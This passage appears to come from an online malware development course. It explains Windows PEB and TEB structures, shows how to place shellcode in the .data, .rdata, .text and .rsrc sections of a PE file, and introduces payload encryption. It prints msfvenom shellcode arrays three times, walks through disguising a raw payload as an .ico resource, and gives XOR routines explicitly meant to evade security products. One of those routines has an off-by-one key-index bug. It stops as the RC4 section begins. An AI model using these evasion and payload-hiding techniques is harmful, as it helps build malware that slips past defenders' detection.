Every process created has its own PEB data structure, that will contain its own set of information about it.

### PEB Structure

The PEB struct in C is shown below. The reserved members of this struct can be ignored.

```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

The non-reserved members are explained below.

#### BeingDebugged

BeingDebugged is a flag in the PEB structure that indicates whether the process is being debugged or not. It is set to 1 (TRUE) when the process is being debugged and 0 (FALSE) when it is not. It is used by the Windows loader to determine whether to launch the application with a debugger attached or not.

#### Ldr

Ldr is a pointer to a??`PEB_LDR_DATA`??structure in the Process Environment Block (PEB). This structure contains information about the process's loaded dynamic link library (DLL) modules. It includes a list of the DLLs loaded in the process, the base address of each DLL, and the size of each module. It is used by the Windows loader to keep track of DLLs loaded in the process. The??`PEB_LDR_DATA`??struct is shown below.

```c
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

`Ldr`??can be leveraged to find the base address of a particular DLL, as well as which functions reside within its memory space. This will be used in future modules to build a custom version of??[GetModuleHandleA/W](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)??for added stealth.

#### ProcessParameters

ProcessParameters is a data structure in the PEB. It contains the command line parameters passed to the process when created. The Windows loader adds these parameters to the process's PEB structure. ProcessParameters is a pointer to the??`RTL_USER_PROCESS_PARAMETERS`??struct that's shown below.

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

`ProcessParameters`??will be leveraged in future modules to perform actions such as command line spoofing.

#### AtlThunkSListPtr & AtlThunkSListPtr32

`AtlThunkSListPtr`??and??`AtlThunkSListPtr32`??are used by the ATL (Active Template Library) module to store a pointer to a linked list of??_thunking functions_. Thunking functions are used to call functions that are implemented in a different address space, these often represent functions exported from a DLL (Dynamic Link Library) file. The linked list of thunking functions is used by the ATL module to manage the thunking process.

#### PostProcessInitRoutine

The??`PostProcessInitRoutine`??field in the PEB structure is used to store a pointer to a function that is called by the operating system after TLS (Thread Local Storage) initialization has been completed for all threads in the process. This function can be used to perform any additional initialization tasks that are required for the process.

TLS and TLS callbacks will be discussed in more detail later when required.

#### SessionId

The SessionID in the PEB is a unique identifier assigned to a single session. It is used to track the activity of the user during the session.

### Thread Environment Block (TEB)

Thread Environment Block (TEB) is a data structure in Windows that stores information about a thread. It contains the thread's environment, security context, and other related information. It is stored in the thread's stack and is used by the Windows kernel to manage threads.

### TEB Structure

The TEB struct in C is shown below. The reserved members of this struct can be ignored.

```c
typedef struct _TEB {
  PVOID Reserved1[12];
  PPEB  ProcessEnvironmentBlock;
  PVOID Reserved2[399];
  BYTE  Reserved3[1952];
  PVOID TlsSlots[64];
  BYTE  Reserved4[8];
  PVOID Reserved5[26];
  PVOID ReservedForOle;
  PVOID Reserved6[4];
  PVOID TlsExpansionSlots;
} TEB, *PTEB;
```

#### ProcessEnvironmentBlock (PEB)

Is a pointer to the PEB structure explained above, PEB is located inside the Thread Environment Block (TEB) and is used to store information about the currently running process.

#### TlsSlots

The TLS (Thread Local Storage) Slots are locations in the TEB that are used to store thread-specific data. Each thread in Windows has its own TEB, and each TEB has a set of TLS slots. Applications can use these slots to store data that is specific to that thread, such as thread-specific variables, thread-specific handles, thread-specific states, and so on.

#### TlsExpansionSlots

The TLS Expansion Slots in the TEB are a set of pointers used to store thread-local storage data for a thread. The TLS Expansion Slots are reserved for use by system DLLs.

### Process And Thread Handles

On the Windows operating system, each process has a distinct process identifier or process ID (PID) which the operating system assigns when the process is created. PIDs are used to distinguish one running process from another. The same concept applies to a running thread, where a running thread has a unique ID that is used to differentiate it from the rest of the existing threads (in any process) on the system.

These identifiers can be used to open a handle to a process or a thread using the WinAPIs below.

- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)??- Opens an existing process object handle via its identifier.
    
- [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)??- Opens an existing thread object handle via its identifier.
    

These WinAPIs will be discussed in further detail later on when required. For now, it's enough to know that the opened handle can be used to perform further actions to its relative Windows object, such as suspending a process or thread.

Handles should always be closed once their use is no longer required to avoid??[handle leaking](https://en.wikipedia.org/wiki/Handle_leak). This is achieved via the??[CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)??WinAPI call.
# 2.0 Undocumented Structures

### Introduction

When referencing the Windows documentation for a structure, one may encounter several??_reserved_??members within the structure. These reserved members are often presented as arrays of??`BYTE`??or??`PVOID`??data types. This practice is implemented by Microsoft to maintain confidentiality and prevent users from understanding the structure to avoid modifications to these reserved members.

With that being said, throughout this course, it will be necessary to work with these undocumented members. Therefore, some modules will avoid using Microsoft's documentation and instead use other websites that have the full undocumented structure, which was likely derived through reverse engineering.

### PEB Structure Example

As mentioned in an earlier module, the Process Environment Block or PEB is a data structure that holds information about a Windows process. However,??[Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)??on the PEB structure shows several reserved members. This makes it difficult to access the members of the structure.

```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

#### Finding Reserved Members

One way to determine what the PEB's reserved members hold is through the??`!peb`??command in??[WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools).

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/undocumented-structs-1224531910-413779d5-2e1d-4813-a545-c690892da2bd.png)

For a more complete PEB structure, refer to Process Hacker's??[PEB structure](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h#L56).

### Alternative Documentation

As previously mentioned, some modules will avoid using Microsoft's documentation and instead use other documentation sources.

- [Process Hacker's Header Files](https://github.com/winsiderss/systeminformer/tree/master/phnt/include)
    
- [undocumented.ntinternals.net](https://web.archive.org/web/20230401045934/http://undocumented.ntinternals.net/)??- Some structures may be outdated
    
- [ReactOS's Documentation](https://doxygen.reactos.org/globals_type.html)
    
- [Vergilius Project](https://www.vergiliusproject.com/)??- Although mainly for Windows kernel structures, it remains a valuable resource.
    

### Considerations

When choosing a structure definition, it's important to be mindful of the following points.

- Some structure definitions only work for a specific architecture, either x86 or x64. If that's the case, ensure the appropriate structure definition is chosen.
    
- In certain cases, it may be necessary to define multiple structures due to the concept of nested structures. For example, a structure such as PEB may contain a member that acts as a pointer to another structure. Therefore, it becomes important to include the definition of the latter structure to ensure its correctly interpreted by the program.
    
- When using a custom definition of a structure, it is not possible to include its original definition found in the Windows SDK simultaneously. For example, Microsoft's definition of the PEB structure is located in??[Winternl.h](https://learn.microsoft.com/en-us/windows/win32/api/winternl/#structures). If one intends to use a different definition from one of the above-mentioned documentation sources, then attempting to include??`Winternl.h`??in the program will result in redefinition errors thrown by Visual Studio's compiler. To avoid this, select only one definition of the structure.
# 2.1 Payload Placement - .data & .rdata Sections

### Introduction

As a malware developer, one will have several options as to where the payload can be stored within the PE file. Depending on the choice, the payload will reside in a different section within the PE file. Payloads can be stored in one of the following PE sections:

- `.data`
- `.rdata`
- `.text`
- `.rsrc`

This module demonstrates how to store payloads in the??`.data`??and??`.rdata`??PE sections.

### .data Section

The??`.data`??section of a PE file is a section of a program's executable file that contains initialized global and static variables. This section is readable and writable, making it suitable for an encrypted payload that requires decryption during runtime. If the payload is a global or local variable, it will be stored in the??`.data`??section, depending on the compiler settings.

The code snippet below shows an example of having a payload stored in the??`.data`??section.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .data saved payload
unsigned char Data_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Data_RawData var : 0x%p \n", Data_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}

```

The image below shows the output of the above code snippet in xdbg. Make note of a few items within the image:

1. The .data section starts at the address??`0x00007FF7B7603000`.

2. The??`Data_RawData`'s base address is??`0x00007FF7B7603040`??which is an offset of??`0x40`??from the .data section.

3. Note the memory protection of the region is specified as??`RW`??which indicates it is a read-write region.


![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.data-section.png)

### .rdata Section

Variables that are specified using the??`const`??qualifier are written as constants. These types of variables are considered "read-only" data. The letter "r" in??`.rdata`??indicates this, and any attempt to change these variables will cause access violations. Furthermore, depending on the compiler and its settings, the??`.data`??and??`.rdata`??sections may be merged, or even merged into the??`.text`??section.

The code snippet below shows an example of having a payload stored in the??`.rdata`??section. The code will essentially be the same as the previous code snippet except the variable is now preceded by the??`const`??qualifier.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .rdata saved payload
const unsigned char Rdata_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Rdata_RawData var : 0x%p \n", Rdata_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

The image below shows the output of running??[dumpbin.exe](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=msvc-170)??on the PE file. Installing Visual Studio's C++ runtime will automatically download dumpbin.exe.

Command:??`dumpbin.exe /ALL <binary-file.exe>`

Scroll down and view the details of the??`.rdata`??section which contains the data stored in its raw binary format.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-1.png)

  

Scrolling down further shows the allocated payload which is highlighted in the image below.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-2.png)
# 2.2 Payload Placement - .text Section

### Introduction

The previous module discussed storing payloads in the??`.data`??and??`.rdata`??sections, while this module covers storing payloads in the??`.text`??section.

### .text Section

Saving the variables in the??`.text`??section differs from saving them in the??`.data`??or??`.rdata`??sections, as it is not just a matter of declaring a random variable. Rather, one must instruct the compiler to save it in the??`.text`??section, which is demonstrated in the code snippet below.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .text saved payload
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Text_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Text_RawData var : 0x%p \n", Text_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

Here, the compiler is told to place the??`Text_rawData`??variable in the??`.text`??section instead of the??`.rdata`??section. The??`.text`??section is special in that it stores variables with executable memory permissions, allowing them to be executed directly without the need for editing the memory region permissions. This is useful for small payloads that are roughly less than 10 bytes.

Inspecting the binary compiled from the above code snippet using the PE-Bear tool reveals that the payload is located in the??`.text`??region.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.text-section.png)
# 2.3 Payload Placement - .rsrc Section

### Introduction

Saving the payload in the??`.rsrc`??section is one of the best options as this is where most real-world binaries save their data. It is also a cleaner method for malware authors, since larger payloads cannot be stored in the??`.data`??or??`.rdata`??sections due to size limits, leading to errors from Visual Studio during compilation.

### .rsrc Section

The steps below illustrate how to store a payload in the??`.rsrc`??section.

1.Inside Visual Studio, right-click on 'Resource files' then click Add > New Item.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-1.png)

2.Click on 'Resource File'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-2.png)

3.This will generate a new sidebar, the Resource View. Right-click on the .rc file (Resource.rc is the default name), and select the 'Add Resource' option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-3.png)

4.Click 'Import'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-4.png)

5.Select the calc.ico file, which is the raw payload renamed to have the??`.ico`??extension.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-5.png)

6.A prompt will appear requesting the resource type. Enter "RCDATA" without the quotes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-6.png)

7.After clicking OK, the payload should be displayed in raw binary format within the Visual Studio project

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-7.png)

8.When exiting the Resource View, the "resource.h" header file should be visible and named according to the .rc file from Step 2. This file contains a define statement that refers to the payload's ID in the resource section (IDR_RCDATA1). This is important in order to be able to retrieve the payload from the resource section later.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-8.png)

Once compiled, the payload will now be stored in the??`.rsrc`??section, but it cannot be accessed directly. Instead, several WinAPIs must be used to access it.

- [FindResourceW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew)??- Get the location of the specified data stored in the resource section of a special ID passed in (this is defined in the header file)
    
- [LoadResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)??- Retrieves a??`HGLOBAL`??handle of the resource data. This handle can be used to obtain the base address of the specified resource in memory.
    
- [LockResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource)??- Obtain a pointer to the specified data in the resource section from its handle.
    
- [SizeofResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource)??- Get the size of the specified data in the resource section.
    

The code snippet below will utilize the above Windows APIs to access the??`.rsrc`??section and fetch the payload address and size.

```c
#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main() {

	HRSRC		hRsrc                   = NULL;
	HGLOBAL		hGlobal                 = NULL;
	PVOID		pPayloadAddress         = NULL;
	SIZE_T		sPayloadSize            = NULL;

	
	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}
	
	// Printing pointer and size to the screen
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);
	printf("[i] sPayloadSize var : %ld \n", sPayloadSize);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

After compiling and running the code above, the payload address along with its size will be printed onto the screen. It is important to note that this address is in the??`.rsrc`??section, which is read-only memory, and any attempts to change or edit data within it will cause an access violation error. To edit the payload, a buffer must be allocated with the same size as the payload and copied over. This new buffer is where changes, such as decrypting the payload, can be made.

### Updating .rsrc Payload

Since the payload can't be edited directly from within the resource section, it must be moved to a temporary buffer. To do so, memory is allocated the size of the payload using??[HeapAlloc](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc)??and then the payload is moved from the resource section to the temporary buffer using??`memcpy`.

```c
// Allocating memory using a HeapAlloc call
PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
if (pTmpBuffer != NULL){
	// copying the payload from resource section to the new buffer 
	memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
}

// Printing the base address of our buffer (pTmpBuffer)
printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);

```

Since??`pTmpBuffer`??now points to a writable memory region that is holding the payload, it's possible to decrypt the payload or perform any updates to it.

The image below shows the Msfvenom shellcode stored in the resource section.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rsrc-payload.png)

Proceeding with the execution, the payload is saved in the temporary buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rsrc-tmpbuffer.png)
# 2.4 Introduction to Payload Encryption
### Payload Encryption

Payload encryption in malware is a technique used by attackers to hide the malicious code contained in a malicious file. Attackers use various encryption algorithms to conceal the malicious code, making it more difficult for security solutions to detect the malicious activity of the file. Encryption also helps the malware to remain hidden and undetected on the user's system for longer periods. Encrypting parts of the malware will almost always be necessary against modern security solutions.

### Encryption Pros and Cons

Encryption can help evade signature-based detection when using signatured code and payloads, but it may not be effective against other forms of detection, such as runtime and heuristic analysis.

It is important to note that the more data that's encrypted within a file, the higher its??[entropy](https://practicalsecurityanalytics.com/file-entropy/). Having a file with a high entropy score can cause security solutions to flag the file or at the very least consider it suspicious and place additional scrutiny on it. Decreasing a file's entropy will be discussed in future modules.

### Encryption Types

The upcoming modules will go through three of the most widely used encryption algorithms in malware development:

- XOR
    
- AES
    
- RC4
# 2.5 Payload Encryption - XOR

### Introduction

XOR encryption is the simplest to use and the lightest to implement, making it a popular choice for malware. It is faster than AES and RC4 and does not require any additional libraries or the usage of Windows APIs. Additionally, it is a bidirectional encryption algorithm that allows the same function to be used for both encryption and decryption.

### XOR Encryption

The code snippet below shows a basic XOR encryption function. The function simply XORs each byte of the shellcode with a 1-byte key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++){
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}
```

### Securing The Encryption Key

Some tools and security solutions can brute force the key which will expose the decrypted shellcode. To make the process of guessing the key more difficult for these tools, the code below performs a minor change and increases the keyspace of the key by making??`i`??a part of the key. With keyspace much larger now, it's more difficult to brute force the key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}
}
```

The code snippet above can still be hardened further. The snippet below performs the encryption process with a key, using every byte of the key repeatedly making it harder to crack the key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A random array of bytes of specific size
	- sKeySize : The size of the key
*/
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize){
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}
```

### Conclusion

It is recommended to utilize XOR encryption for small tasks, such as obscuring strings. However, for larger payloads, it is advised to use more secure encryption methods such as AES.
# 2.6 Payload Encryption - RC4

### Introduction

RC4 is a fast and efficient stream cipher that is also a bidirectional encryption algorithm that allows the same function to be used for both encryption and decryption. There are several C implementations of RC4 publicly available but this module will demonstrate three ways of performing RC4 encryption.

Note that diving into how the RC4 algorithm works is not the goal of this module and it's not required to fully understand it in depth. Rather the goal is encrypting the payload to evade detection.

### RC4 Encryption - Method 1

